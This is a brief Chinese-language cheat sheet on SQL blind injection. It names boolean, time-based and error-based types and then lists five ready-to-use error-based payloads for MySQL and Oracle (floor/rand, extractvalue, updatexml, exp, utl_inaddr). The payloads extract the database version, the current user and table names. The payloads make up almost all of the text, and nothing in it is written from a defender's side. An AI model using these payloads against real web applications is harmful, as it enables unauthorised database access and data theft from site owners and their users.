# SQL盲注

盲注分类 ：

①布尔形注入 ②时间盲注 ③报错注入

## 常见报错注入函数

1.floor\(Mysql\): and\(select 1 from \(select count\(\*\), concat\(version\(\), floor\(rand\(0\)\*2\)\)x from information\_schema. tables group by x\)a\);

```sql
and(select 1 from (select count(*), concat(version(), floor(rand(0)*2))x from information_schema. tables group by x)a);
```

2.Extractvalue\(Mysql\): and extractvalue\(1, concat\(0x5c,\(select table\_name from information\_schema.tables limit 1\)\);

```sql
and extractvalue(1,concat(0x5c,(select table_name from information_schema.tables limit 1));
```

3.Updatexml\(Mysql\): and 1=\(updatexml\(1,concat\(0x3a,\(select user\(\)\)\),1\)\)

```sql
and 1=(updatexml(1,concat(0x3a,(select user())),1))
```

4.EXP: Exp\(~\(select \* from\(select user\(\)\)a\)\)

```sql
Exp(~(select * from(select user())a))
```

5.UTL\_INADDR. get\_host\_address\(Oracle\): and 1=utl\_inaddr.get\_host\_address\(\(select banner\(\) from sys.v\_$version where rownum=1\)\)

```sql
and 1=utl_inaddr.get_host_address((select banner() from sys.v_$version where rownum=1));
```



